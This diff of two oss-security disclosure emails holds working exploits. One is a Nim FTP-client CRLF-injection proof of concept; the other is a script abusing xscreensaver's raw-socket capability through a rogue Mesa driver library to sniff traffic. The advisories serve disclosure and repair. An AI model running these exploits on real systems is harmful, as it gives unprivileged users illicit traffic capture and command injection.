@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2884" "Thursday" "4" "February" "2021" "15:58:23" "+0100" "Martin Ortner" "martin.ortner@consensys.net" "<F0E1DB22-8CF0-46D2-9E59-C45FF50D2C2C@consensys.net>" "115" "[oss-security] [CVE-2020-15690] Nim - stdlib asyncftpd - Crlf Injection" nil nil nil "2" "2021020414:58:23" "[oss-security] [CVE-2020-15690] Nim - stdlib asyncftpd - Crlf Injection" (number mark "U       martin.ortne Feb  4  115/2884  " thread-indent "\"[oss-security] [CVE-2020-15690] Nim - stdlib asyncftpd - Crlf Injection\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] [CVE-2020-15690] Nim - stdlib asyncftpd - Crlf Injection" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["6664" "Saturday" "17" "April" "2021" "07:31:05" "-0700" "Tavis Ormandy" "taviso@gmail.com" nil "231" "[oss-security] xscreensaver package caps gets raw socket" nil nil nil "4" nil nil (number mark "U       taviso@gmail Apr 17  231/6664  " thread-indent "\"[oss-security] xscreensaver package caps gets raw socket\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] xscreensaver package caps gets raw socket" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 32554 invoked by uid 550); 4 Feb 2021 15:14:23 -0000
+Received: (qmail 1988 invoked by uid 550); 17 Apr 2021 17:38:28 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,159 +12,273 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 25722 invoked from network); 4 Feb 2021 14:58:37 -0000
+Received: (qmail 11866 invoked from network); 17 Apr 2021 14:31:18 -0000
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=consensys.net; s=google;
-        h=from:content-transfer-encoding:mime-version:subject:message-id:date
-         :to;
-        bh=LC/CtskIU5zUqjnT1WDFqo3Z88ZzuvKuovar+jf9cfM=;
-        b=Y89ag2m3L6srgAjyxwgk09PHAZPAPADdk1UwWmjuh8ObZWN+gxQbuGnkc80RyhqkYj
-         DHbNy63Q6cnBjfKravsf1fo/I2QYQZ6Djl+yB+XE0fFW+DeuipEub/0kYKNNDqnvRcgG
-         cLGjw6lbC1f2pkdhw0jnoKvHw4rZIAe9Z9T4yGPyJVrHkKlYxiZ0NhsRQFvOpWKPpnN5
-         4d1xL5zO0ME/H6tdgqTYBxGvGCkRvMCBhinjrwEgXLbkhiU72lkauzu7cDL6qsFnFXHX
-         g69ZIaGCchBygrVD0nLfyUiRr/bG3N24dZ88YXluRm0qYMRuMxDiZspFl6IQS/hZmCP1
-         PrIA==
+        d=gmail.com; s=20161025;
+        h=date:from:to:cc:subject:message-id:mime-version:content-disposition
+         :user-agent;
+        bh=AGb/YXUyWK4ZKGUysm4H52zAZIDgciSRpTFfDIZ2dN0=;
+        b=IDmIAsL0zaHqAh4FaeXQRMbF+pmrchYnuJyyInyUXhBihhbB/K8AyHM+ToOO9jd2O5
+         YkQUsXBFVST5H2IA7+cPYKg3+U2g2rSvzKzqc2AJdI63g8cjeWSTfLLDR+xU6BW+LfHL
+         AaeH/BZ0ODwtMVqusZ3flPgpMTIDhdVF/MACSUp6mLOOb2kx8QdV9Ib6+fMSZQFBZBKq
+         GNqpxooZ9899geAmh3UvF4iyXbbPolpKJc8ZlTZl2ca3Ruv+Wb6c7QqPwy8davwACfCD
+         Ivv0VwS9Pkk3Omk+kMS9ErbB6cMi0YGJT8kGl2lQ6WlJTfuzMQfgBdQPom0lLaguZaOU
+         b+vQ==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
         d=1e100.net; s=20161025;
-        h=x-gm-message-state:from:content-transfer-encoding:mime-version
-         :subject:message-id:date:to;
-        bh=LC/CtskIU5zUqjnT1WDFqo3Z88ZzuvKuovar+jf9cfM=;
-        b=Q6R4wzHtvQzhHDLVMAcaI6MKIaJ4kUINP0aXLPisjvP3QdoMbm6PK9Wyhn1qE1gI7B
-         SGhe3V1aZaFQydkHobgJ5IZ1BojkNb8dNirc+bSw65WBpAfTEV8V+kBmt1DZI7YSh1Ww
-         zZYV3wng9IsHG+Pvyk4KIshaT61sQ8obwPK6iHbWZLm7RzG/nJ+vfz4D7EGlgQdsEcS8
-         liITRZxeGEXk5BqasIGRugJINvjHgERgjZTYlSjx6qTENMStHzGU8NSN81y1P+tAwFG1
-         B9PIr1LcI033977sL9LYBqJJu4bUKsKVhDT7cdCK7cxwXL7owZqgRi7kF3X42tHl0nOm
-         OiQQ==
-X-Gm-Message-State: AOAM532IlknevVF3qDf5JFsbAWUuMrAGnLPyZ8cACUBeHbX8ZvUm005n
-	Ze+9C94nmJ1hlFjbAua842i1NxB2kysdRGdtPx4R87fIkrjHZG+njx5VQyiHQ1gSg+5U3etGVP3
-	Pfg4dZDmzlBsrLeMATvwF8sqOt4t2D+kUddGWkNx9iDlD7bQOzv7WmRBXXlCqHD8y5c7YCjepP1
-	6duGrF84ACavj7fT8sqtI=
-X-Google-Smtp-Source: ABdhPJw5KKsQ5ArEk+70yRY+/YiSvWR5Ydh8461cMRwF3R+0bO9ln1FyJShxg/knS/sqiYXTvkfmAA==
-X-Received: by 2002:a1c:2092:: with SMTP id g140mr8027172wmg.4.1612450705849;
-        Thu, 04 Feb 2021 06:58:25 -0800 (PST)
-From: Martin Ortner <martin.ortner@consensys.net>
-Content-Type: text/plain;
-	charset=utf-8
-Content-Transfer-Encoding: quoted-printable
-Mime-Version: 1.0 (Mac OS X Mail 13.4 \(3608.120.23.2.4\))
-Message-Id: <F0E1DB22-8CF0-46D2-9E59-C45FF50D2C2C@consensys.net>
-Date: Thu, 4 Feb 2021 15:58:23 +0100
+        h=x-gm-message-state:date:from:to:cc:subject:message-id:mime-version
+         :content-disposition:user-agent;
+        bh=AGb/YXUyWK4ZKGUysm4H52zAZIDgciSRpTFfDIZ2dN0=;
+        b=e/Venvmc8SiiWRFhxCEWD1wty63PrcUclCUsIKFVZd4McQICeXEJAct6ySPAvWMb3O
+         2dgMmRrtw7c7zJ4IscQrS4o00zzT8PbTdb4mg6TEK5BdZ+4pg5kYNE+FiotgcLsf4WVW
+         nP9Spfp10dnzD0n77cxSVNcrwOAgFRAfLja9kLIBD7dcoMVcLA7X57+1Q1qAl7sVDg15
+         1gKhKLkFoOTxH0qOP36kzB6OlEv3V7v8uwCpHS9lSNayips5qEfWdZuNofu9QG5MUk/5
+         c+yxxe5npYMmOvPQT8MuQPvpYs5cwYp1zNxdUjoFNjspbtNfupiHwcm2d7gfISXfm5Sw
+         KeBw==
+X-Gm-Message-State: AOAM533HOscBsdJBTUFina3HhFCCgaFobJ9WOpZna5x8uJ3Gx1em/lQT
+	CjaPB6NntJtjjpoTxXbcH/9MV7PCSVNrL42K
+X-Google-Smtp-Source: ABdhPJxEzYQz1Kd+1sg5yxNJTA4j9BuPESrHKERWzKN1kPFE1sL1XTTM45p2stXOIgrYNWbkd7x41A==
+X-Received: by 2002:a17:90a:ff06:: with SMTP id ce6mr14886543pjb.204.1618669866261;
+        Sat, 17 Apr 2021 07:31:06 -0700 (PDT)
+Date: Sat, 17 Apr 2021 07:31:05 -0700
+From: Tavis Ormandy <taviso@gmail.com>
 To: oss-security@lists.openwall.com
-X-Mailer: Apple Mail (2.3608.120.23.2.4)
-Subject: [oss-security] [CVE-2020-15690] Nim - stdlib asyncftpd - Crlf Injection
+Cc: security@debian.org
+Message-ID: <20210417143105.GB3276@thinkstation>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="UugvWAfsgieZRqgk"
+Content-Disposition: inline
+User-Agent: Mutt/1.13.2 (2019-12-18)
+Subject: [oss-security] xscreensaver package caps gets raw socket
 
-title: "Nim - stdlib asyncftpd - Crlf Injection"
-date: 2021-02-04T15:25:49+01:00
+--UugvWAfsgieZRqgk
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
 
-cve: ["CVE-2020-15690"]
-vendor: nim-lang
-vendorUrl: https://nim-lang.org/
-authors: tintinweb
-affectedVersions: [ "< 1.2.6" ]
-vulnClass: CWE-93
+Hello, I noticed that at least debian (maybe others) ship xscreensaver
+hack with cap_net_raw enabled:
 
-Vulnerability Note: https://consensys.net/diligence/vulnerabilities/nim-asy=
-ncftpd-crlf-injection/
-Vulnerability Note: https://github.com/tintinweb/pub/tree/master/pocs/cve-2=
-020-15690
-Group: https://consensys.net/diligence/research/
+$ getcap /usr/libexec/xscreensaver/sonar
+/usr/libexec/xscreensaver/sonar cap_net_raw=p
 
+That seems like a bug, you can just load some driver and get a raw
+socket. I wrote a quick exploit, this script will run tcpdump without
+needing root.
 
+$ bash sock.sh
+17:43:55.000000 IP (tos 0x0, ttl 64, id 14541, offset 0, flags [DF], proto ICMP (1), length 84)
+    debian > sfo07s17-in-f78.1e100.net: ICMP echo request, id 59166, seq 1, length 64
+17:43:55.000000 IP (tos 0x0, ttl 128, id 42276, offset 0, flags [none], proto ICMP (1), length 84)
+    sfo07s17-in-f78.1e100.net > debian: ICMP echo reply, id 59166, seq 1, length 64
 
-# Vulnerability Note
+I sent a report to debian, jwz and mesa. We concluded no embargo is
+necessary, so continuing the discussion here.
 
-## Summary=20
+Summary of discussion so far:
 
-In Nim before 1.2.6, the standard library asyncftpclient lacks a check for =
-whether a message contains a newline character.
+- In theory, mesa support running in a privileged context, their
+  documentation says they disable dangerous features in setuid/setgid
+  binaries:
 
-## Details
+    https://mesa-docs.readthedocs.io/en/latest/egl.html
 
-### Description
+  In fact, this is broken because they only check if (geteuid() !=
+  getuid()) { ... }. That check doesn't even handle setgid, let alone file
+  caps. If mesa agree this is a bug, simply changing their checks to if
+  (getauxval(AT_SECURE)) { ... } might make this bug go away, and handle
+  file caps and setgid for free. I filed a bug for that, but there
+  hasn't been a response:
+  https://gitlab.freedesktop.org/mesa/mesa/-/issues/4549
 
-The nim standard library `asyncftpclient` is vulnerable to multiple `CR-LF`=
- injections. An injection is possible if the attacker controls any argument=
- that is passed to the remote server such as the `username` and `password` =
-to `newAsyncFtpClient`.=20
+- The code could use ping sockets instead, but they're still rarely
+  enabled by default, and users have to set the ping_group_range sysctl.
+  I personally think it's time to enable them by default, but that's a
+  different discussion :-)
 
+- If neither of those two options work, then I guess we will have to
+  try to make using mesa safe...but it sounds really hard. The obvious
+  fix for right now is trying to clean up the environment, e.g.:
 
-The root cause of this issue is that the `send(ftp, msg)` allows `msg` to c=
-ontain `CR-LF` control characters. An attacker that controls any unchecked =
-input to `send()` can therefore inject arbitrary FTP commands.=20
+  (Note: untested)
 
-```nim
-proc send*(ftp: AsyncFtpClient, m: string): Future[TaintedString] {.async.}=
- =3D
-  ## Send a message to the server, and wait for a primary reply.
-  ## ``\c\L`` is added for you.
-  ##
-  ## **Note:** The server may return multiple lines of coded replies.
-  await ftp.csock.send(m & "\c\L")
-  return await ftp.expectReply()
-```
+    char *allowed[][2] = {
+        { "DISPLAY", 0 },
+        { "XAUTHORITY", 0 },
+        NULL,
+    };
+    for (int i = 0; allowed[i][0]; i++)  {
+        if (getenv(allowed[i][0])) {
+            allowed[i][1] = strdup(getenv(allowed[i][0]));
+        }
+    }
+    if (clearenv() != 0) {
+        abort();
+    }
+    for (int i = 0; allowed[i][0]; i++)  {
+        if (allowed[i][1]) {
+            setenv(allowed[i][0], allowed[i][1], 1);
+            free(allowed[i][1]);
+        }
+    }
 
+    // ...
+    MesaInitWhatever();
 
-### Proof of Concept
+I *think* this will work in main(), but it's possible there are some
+constructors somewhere that execute before main() I've missed. If that's
+the case, then I guess we will need a wrapper binary that does execve()
+and passes a non-cloexec fd with a sanitized environment?
 
-Note: `nim c -r -d:ssl  crlf_inject.nim`
+The problem is that even if we make cleaning up the environment work,
+you're always going to need $DISPLAY, and any code exec bug connecting
+to a malicious X server will be a security bug.... and that sounds super
+hard to get right?
 
-* Injecting FTP commands via `user` and `pass`
+I dunno, thoughts on fixing this appreciated...
 
-```nim
-import asyncdispatch, asyncftpclient
-proc main() {.async.} =3D
-  var ftp =3D newAsyncFtpClient("localhost", user =3D "test\nINJECTED_LINE =
-test test", pass =3D "test\nINJECTED_LINE test test 2")
-  await ftp.connect()
-  echo("Connected")
-waitFor(main())
-```
+Tavis.
 
-Output:
+-- 
+ _o)            $ lynx lock.cmpxchg8b.com
+ /\\  _o)  _o)  $ finger taviso@sdf.org
+_\_V _( ) _( )  @taviso
 
-```
-=E2=87=92 nim c -r -d:ssl  crlf_inject.nim
-...
-Hint: 104717 LOC; 1.030 sec; 113.309MiB peakmem; Debug build; proj: /Users/=
-tintin/workspace/nim/test/issues/asyncftpclient/crlf_inject.nim; out: /User=
-s/tintin/workspace/nim/test/issues/asyncftpclient/crlf_inject [SuccessX]
-Hint: /Users/tintin/workspace/nim/test/issues/asyncftpclient/crlf_inject  [=
-Exec]
-Connected
-```
+--UugvWAfsgieZRqgk
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: attachment; filename="sonar-sock-demo.sh"
 
+#!/bin/sh
+#
+# You can use xscreensaver to get tcpdump to work without needing root.
+#
 
-```
-=E2=87=92  nc -l 21
-220 fake ftp
-USER test
-INJECTED_LINE test test
-230 Hi test, thanks for injecting a line...
-PASS test
-INJECTED_LINE test test 2
-230 thx for injecting another line...
-```
+tmpdir=$(mktemp -d)
 
-### Proposed Fix
+cat << EOF > ${tmpdir}/sock.c
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <stdbool.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <netinet/ip.h>
+#include <linux/if_ether.h>
+#include <sys/capability.h>
+#include <err.h>
+#include <time.h>
 
-- properly validate user input
-- raise an exception if `CR` or `LF` if found in the `msg` passed to `send(=
-)`=20
+#define PCAP_MAGIC 0xa1b2c3d4
+#define PCAP_MAJOR 2
+#define PCAP_MINOR 4
+#define LINKTYPE_ETHERNET 1
 
-## Vendor Response
+static struct {
+    uint32_t magic_number;
+    uint16_t version_major;
+    uint16_t version_minor;
+    int32_t  thiszone;
+    uint32_t sigfigs;
+    uint32_t snaplen;
+    uint32_t network;
+} pcaphdr;
 
-Vendor response: fixed in 1.2.6
+static struct {
+    uint32_t ts_sec;
+    uint32_t ts_usec;
+    uint32_t incl_len;
+    uint32_t orig_len;
+} rechdr;
 
-### Timeline
+static const cap_value_t caplist[] = { CAP_NET_RAW };
 
-```
-JUL/13/2020 - contact dom96//AT//telegram; provided details, PoC
-FEB/04/2020 - public disclosure
-```
+void __attribute__((constructor)) init()
+{
+    FILE *tcpdump;
+    int sock;
+    cap_t caps;
+    char buffer[IP_MAXPACKET];
 
-## References
+    // Enable CAP_NET_RAW
+    caps = cap_get_proc();
+    cap_set_flag(caps, CAP_EFFECTIVE, 1, caplist, CAP_SET);
+    cap_set_proc(caps);
+    cap_free(caps);
 
-* [1] https://nim-lang.org/
-* [2] https://nim-lang.org/install.html
-* [3] https://en.wikipedia.org/wiki/Nim_(programming_language)
+    // Now we can get a raw socket.
+    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
 
+    if (sock < 0) {
+        err(EXIT_FAILURE, "failed to create socket");
+    }
+
+    // Prepare a pcap header
+    pcaphdr.magic_number = PCAP_MAGIC;
+    pcaphdr.version_major = PCAP_MAJOR;
+    pcaphdr.version_minor = PCAP_MINOR;
+    pcaphdr.snaplen = sizeof(buffer);
+    pcaphdr.network = LINKTYPE_ETHERNET;
+
+    tcpdump = popen("/usr/bin/tcpdump -vv -r- || /usr/sbin/tcpdump -vv -r-", "w");
+
+    if (tcpdump == NULL) {
+        err(EXIT_FAILURE, "you dont have tcpdump installed");
+    }
+
+    if (fwrite(&pcaphdr, sizeof(pcaphdr), 1, tcpdump) != 1) {
+        err(EXIT_FAILURE, "failed to write pcap header");
+    }
+
+    while (true) {
+        ssize_t cnt = recvfrom(sock, buffer, sizeof(buffer), 0, NULL, NULL);
+
+        if (cnt < 0) {
+            err(EXIT_FAILURE, "failed to read from socket");
+        }
+
+        rechdr.ts_sec = time(0);
+        rechdr.incl_len = cnt;
+        rechdr.orig_len = cnt;
+
+        if (fwrite(&rechdr, sizeof(rechdr), 1, tcpdump) != 1) {
+            err(EXIT_FAILURE, "failed to write record header");
+        }
+
+        if (fwrite(buffer, cnt, 1, tcpdump) != 1) {
+            err(EXIT_FAILURE, "failed to write packet");
+        }
+
+        fflush(tcpdump);
+    }
+}
+EOF
+
+if ! gcc -fPIC -shared -o ${tmpdir}/swrast_dri.so ${tmpdir}/sock.c -lcap; then
+    echo compile failed, make sure libcap-dev and gcc available
+    exit 1
+fi
+
+if ! test -x /usr/bin/tcpdump -o -x /usr/sbin/tcpdump; then
+    echo you dont have tcpdump installed, its used by this poc
+    exit 1
+fi
+
+if ! test -x /usr/libexec/xscreensaver/sonar; then
+    if ! test -x /usr/lib/xscreensaver/sonar; then
+        echo you dont seem to have xscreensaver installed
+        exit 1
+    else
+        sonar=/usr/lib/xscreensaver/sonar
+    fi
+else
+    sonar=/usr/libexec/xscreensaver/sonar
+fi
+
+if ! env LIBGL_DRIVERS_PATH=${tmpdir}                                   \
+         MESA_LOADER_DRIVER_OVERRIDE=../../../../../../${tmpdir}/swrast \
+         ${sonar}; then
+    echo failed to run xsreensaver
+    exit 1
+fi
+
+--UugvWAfsgieZRqgk--
